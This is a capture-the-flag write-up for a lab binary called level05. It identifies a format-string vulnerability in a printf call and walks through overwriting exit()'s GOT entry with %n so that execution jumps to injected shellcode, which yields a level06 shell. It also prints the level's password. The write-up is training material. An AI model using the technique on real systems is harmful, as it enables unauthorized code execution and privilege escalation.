## level05

	username: level05
	password: 3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN

### Mitigations applied:

```
$ checksec --file level05
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   level05
```

### Usage:

This program converts uppercase characters to lowercase.

```
$ ./level05
QWErty123@$
qwerty123@$
```

### Analysis:

`fgets()` is used to get user input.

```
/*
   0x0804845d <+25>:	mov    eax,ds:0x80497f0
   0x08048462 <+30>:	mov    DWORD PTR [esp+0x8],eax
   0x08048466 <+34>:	mov    DWORD PTR [esp+0x4],0x64
   0x0804846e <+42>:	lea    eax,[esp+0x28]
   0x08048472 <+46>:	mov    DWORD PTR [esp],eax
   0x08048475 <+49>:	call   0x8048350 <fgets@plt>
 */
fgets(buf, 0x64, stdin);
```

And for each character in it, if it is an uppercase letter, they convert it to lowercase.

```
/*
   0x08048487 <+67>:	lea    eax,[esp+0x28]
   0x0804848b <+71>:	add    eax,DWORD PTR [esp+0x8c]
   0x08048492 <+78>:	movzx  eax,BYTE PTR [eax]
   0x08048495 <+81>:	cmp    al,0x40
   0x08048497 <+83>:	jle    0x80484cb <main+135>
   0x08048499 <+85>:	lea    eax,[esp+0x28]
   0x0804849d <+89>:	add    eax,DWORD PTR [esp+0x8c]
   0x080484a4 <+96>:	movzx  eax,BYTE PTR [eax]
   0x080484a7 <+99>:	cmp    al,0x5a
   0x080484a9 <+101>:	jg     0x80484cb <main+135>
 */
if (buf[var1] > 0x40 && buf[var1] <= 0x5a)
{
	/*
	   0x080484ab <+103>:	lea    eax,[esp+0x28]
	   0x080484af <+107>:	add    eax,DWORD PTR [esp+0x8c]
	   0x080484b6 <+114>:	movzx  eax,BYTE PTR [eax]
	   0x080484b9 <+117>:	mov    edx,eax
	   0x080484bb <+119>:	xor    edx,0x20
	   0x080484be <+122>:	lea    eax,[esp+0x28]
	   0x080484c2 <+126>:	add    eax,DWORD PTR [esp+0x8c]
	   0x080484c9 <+133>:	mov    BYTE PTR [eax],dl
	 */
	buf[var1] = buf[var1] ^ 0x20;
}
```

Then resulting string is passed to `printf` as its only argument.

```
/*
   0x08048500 <+188>:	lea    eax,[esp+0x28]
   0x08048504 <+192>:	mov    DWORD PTR [esp],eax
   0x0804850c <+200>:	mov    DWORD PTR [esp],0x0
   0x08048513 <+207>:	call   0x8048370 <exit@plt>
 */
printf(buf);
exit(0);
```

The problem here is the user input will treated by `printf` as a format string, which leads to reading data from the stack and even writing to it.

```
$ ./level05
%p %p %p %p
0x64 0xf7fcfac0 0xf7ec3add 0xffffd6ef
```

This binary is dynamically linked, which means functions from external libraries are loaded at runtime.

More so, if we look at the output of `checksec` command, we notice `RELRO` is set to `NO RELRO`, this means functions are loaded at their first call, then their addresses are to stored in the Global Offset Table (GOT) for further use.

We can take advantage of this and overwrite the address of `exit()` in the GOT and make it point to out injected shellcode.

### Exploit

Found the address of `exit()` at GOT: 0x80497e0

```
(gdb) disas 'exit@plt'
Dump of assembler code for function exit@plt:
   0x08048370 <+0>:	jmp    DWORD PTR ds:0x80497e0
...
```

Found the index of our input in printf, this will contain the address we want to overwrite (0x80497e0).

```
$ ./level05
AAAA %10$p
aaaa 0x61616161
```

Then used the `%n` flag in printf to write the shellcode's address into it.

We created a [script](Resources/exploit.py) to do that.

```
$ scp Resources/exploit.py level05@localhost:/tmp/exp.py -p 2222
$ $ (python /tmp/exp.py; cat) | ./level05
...
whoami
level06
```
